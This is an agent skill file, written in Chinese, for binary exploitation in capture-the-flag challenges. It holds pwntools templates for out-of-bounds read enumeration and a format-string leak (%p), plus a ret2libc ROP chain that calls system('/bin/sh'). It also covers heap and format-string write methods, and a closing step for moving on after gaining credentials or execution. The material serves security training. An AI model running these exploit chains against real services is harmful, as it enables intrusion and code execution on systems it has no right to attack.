---
name: binary-pwn
description: 二进制/内存漏洞利用（裸 TCP 行协议与本地程序）。用于内存安全题，覆盖越界读/写、栈溢出、堆溢出、UAF、格式化字符串、信息泄露，以及从信息泄露到 ret2libc/ROP 的完整利用。判定为二进制题时加载。 使用 python3-pwntools、checksec、gdb、ROPgadget。
---

# 二进制 / 内存漏洞利用

目标：先确认可用原语和 flag 所在位置；可直接读取时优先读取，需要控制流时再构造完整利用链。

## 0. 交互骨架（先摸清菜单）

```python
from pwn import *
context.log_level = 'error'
p = remote('TARGET', PORT)
print(p.recvuntil(b'>', timeout=3))
p.sendline(b'help'); print(p.recv(timeout=3))
```

必做：`help` / 空输入 / 超长输入（`A*1000`）各试一次，观察崩溃点与菜单结构。

## 1. 按服务形态定位漏洞

| 服务形态 | 漏洞 | 打法 |
|---|---|---|
| 令牌/键值存储 | 栈越界读、未初始化内存 | 存短串后按大长度读，泄露相邻内存 |
| LRU/缓存 | 淘汰后未清零 | 塞满触发淘汰，再读旧槽位拿历史对象 |
| heartbeat/回显 | 长度未校验 | 声明长度 >> 实际，读越界内存 |
| 响应构造（HTTP 头/体） | 边界计算错误 | 构造超长头/体越界 |
| 偏移写入 | 任意地址写 | 覆盖指针/长度/返回地址 |
| 格式化字符串 | 用户输入直接进 printf | `%p` 泄露栈，`%n` 写 |

## 2. 越界读枚举（最高性价比）

```python
for n in [16, 32, 64, 128, 256, 512, 1024, 4096, 8192]:
    p = remote('TARGET', PORT)          # 每次新连接！
    p.recvuntil(b'>')
    p.sendline(b'store AAAA')
    p.recvuntil(b'>')
    p.sendline(f'read {n}'.encode())
    d = p.recv(timeout=2)
    print(n, d[:300])
    if b'flag{' in d or b'FLAG{' in d:
        print('HIT', n, d)
    p.close()
```

先检查目标是否真的在进程内存，不能仅凭越界读得到指针就推断 flag 存在。

## 3. Info leak 的常见位置

- 栈上残留：上一次请求的缓冲区未清零
- 堆相邻块：小对象分配在 flag 旁边
- 全局 .bss/.data：配置与密钥
- 指针泄露：`%p` 拿到 libc/stack 地址 → 算基址

```python
p.sendline(b'%p.%p.%p.%p.%p.%p')
```

## 4. 完整利用（需要时）

```bash
checksec --file=./chall
file ./chall
ROPgadget --binary ./chall | grep -E 'pop rdi|ret|syscall'
```

**栈溢出标准链**
```python
# 1) 找偏移
cyclic(200)                      # 触发崩溃
cyclic_find(core.read(core.sp, 8))   # core = p.corefile；按架构确认覆盖位置
# 2) 泄露 libc
payload = b'A'*off + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main)
# 3) 算基址 + ret2libc
libc.address = leaked - libc.sym['puts']
payload = b'A'*off + p64(ret) + p64(pop_rdi) + p64(next(libc.search(b'/bin/sh'))) + p64(libc.sym['system'])
```

**堆题顺序**：确认对象生命周期与可控字段，再建立泄露或写入原语；依据实际 libc 版本和保护机制选择目标。
**格式化字符串**：`%n` 写目标地址（用 `%<val>c%<idx>$n`），先确认参数偏移。

## 5. 本地程序题

```bash
file ./chall && checksec --file=./chall
strings -n 6 ./chall | grep -iE 'flag|/bin/sh|system|pass'
ltrace ./chall          # 看库调用比较
strace ./chall          # 看文件/系统调用
gdb -q ./chall          # 比较处下断点 dump 寄存器
```
有 flag 文件时先检查任意读能力；SUID 题另核对文件权限与题目目标。

## 6. 稳定性要点

- **每次探测用新连接**：畸形包会打崩进程，同连接继续试拿不到有效结果。
- 远程先确认服务是否重启（崩了之后重连是否成功）——不重启的题必须一次成功。
- 有 `timeout` 的服务要做快，别在交互里做重计算。

## 7. 反模式

- ❌ 畸形包打崩进程后在同连接继续试。
- ❌ 不枚举长度/偏移就上 ROP。
- ❌ 未确认目标是否在内存中，就假定越界读一定能拿到 flag。
- ❌ 只本地调试不验证远程环境（libc 版本可能不同）。

## 8. 输出

`漏洞类型 + 触发序列（脚本）+ 泄露内容/flag`。

## 9. 漏洞分析到稳定利用

1. 记录架构、文件类型、PIE/NX/Canary/RELRO、libc 或运行镜像；先确认本地与远程差异。
2. 复现崩溃并最小化输入；区分越界读、越界写、UAF、格式化字符串和逻辑错误。保存触发样本、偏移、寄存器及内存证据。
3. 写出原语边界：可读/写地址范围、字节数、次数、坏字符、连接是否重置。信息泄露只在能定位基址时才进入 ROP/堆链。
4. 堆题记录分配、释放、复用顺序，先验证对象重叠或指针可控，再看 libc 版本和可覆盖目标。
5. 本地脚本至少多次重跑，远程再验证协议、超时与泄露解析。不同环境应重新计算地址，不硬编码本地偏移。

逆向定位困难时配合 reverse-engine；拿到新的凭据、文件或执行权限后转 multi-stage。
